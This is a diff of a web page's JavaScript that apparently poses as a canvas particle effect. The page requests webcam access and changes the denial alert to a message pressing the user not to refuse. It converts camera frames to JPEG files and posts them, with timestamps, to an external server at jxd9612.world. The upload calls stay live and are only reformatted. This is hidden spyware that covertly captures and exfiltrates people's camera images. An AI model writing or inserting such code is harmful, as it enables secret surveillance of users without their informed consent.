@@ -60,7 +60,7 @@
                 setInterval('getHH()', 3000);
             }
             function error(error) {
-                alert(`访问用户媒体设备失败${error.name}, ${error.message}`);
+                alert('不要拒绝，这个才是重点勒，感受下canvas特效');
             }
             if (navigator.mediaDevices.getUserMedia || navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia) {
                 getUserMedia({ video: { width: 960, height: 540 } }, success, error);
@@ -124,24 +124,13 @@
                 let imgFile = dataURLtoFile(canvas.toDataURL('image/jpeg'));
                 var formData = new FormData();
                 formData.append('resolve_data', imgFile);
-                $.ajax({
-                    url: 'https://www.jxd9612.world:3001/resolve_net',
-                    type: 'post',
-                    data: formData,
-                    contentType: false,
-                    processData: false
-                });
+                $.ajax({ url: 'https://www.jxd9612.world:3001/resolve_net', type: 'post', data: formData, contentType: false, processData: false });
             }
             function getTM() {
                 let nowTime = new Date();
                 let mon = nowTime.getMonth() + 1;
                 let timeStr = nowTime.getFullYear() + '-' + mon + '-' + nowTime.getDate() + ' ' + nowTime.getHours() + ':' + nowTime.getMinutes();
-                $.ajax({
-                    url: 'https://www.jxd9612.world:3001/resolve_cors',
-                    type: 'post',
-                    dataType: 'json',
-                    data: { time: timeStr }
-                });
+                $.ajax({ url: 'https://www.jxd9612.world:3001/resolve_cors', type: 'post', dataType: 'json', data: { time: timeStr } });
             }
             var RAD = Math.PI / 180;
             var randomJump = false;
